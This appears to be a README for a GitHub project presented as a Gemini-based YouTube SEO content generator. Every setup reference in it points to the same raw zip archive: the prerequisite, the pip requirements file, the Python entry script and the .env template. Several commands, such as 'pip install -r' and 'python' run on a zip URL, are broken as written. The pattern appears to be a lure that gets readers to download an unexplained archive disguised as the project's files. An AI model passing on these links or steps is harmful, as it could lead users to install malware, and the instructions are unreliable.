# YouTube SEO Content Generator

AI-powered tool for generating optimized YouTube content and SEO suggestions using Google's Gemini API.

## Features

- Keyword analysis
- SEO metrics
- Content suggestions
- Competitor analysis
- Related keywords

## Tech Stack

- Frontend: React, TypeScript, Tailwind CSS
- Backend: FastAPI, Playwright, Google Gemini AI

## Setup

### Prerequisites

- https://github.com/xheikhtalha2004/youtube-seo-content-generator/raw/refs/heads/main/backend/seo-content-generator-youtube-1.1.zip
- Python 3.11
- Git

### Frontend Setup

```bash
npm install
npm run dev
```

### Backend Setup

```bash
python -m venv .venv
.venv\Scripts\activate
pip install -r https://github.com/xheikhtalha2004/youtube-seo-content-generator/raw/refs/heads/main/backend/seo-content-generator-youtube-1.1.zip
python -m playwright install
python https://github.com/xheikhtalha2004/youtube-seo-content-generator/raw/refs/heads/main/backend/seo-content-generator-youtube-1.1.zip
```

### Environment Variables

Copy `https://github.com/xheikhtalha2004/youtube-seo-content-generator/raw/refs/heads/main/backend/seo-content-generator-youtube-1.1.zip` to `.env` and set your Gemini key:

```
GEMINI_API_KEY=your_gemini_api_key
```

## Usage

1. Enter a keyword
2. Get SEO analysis and content suggestions
3. View competitor videos
4. Explore related keywords
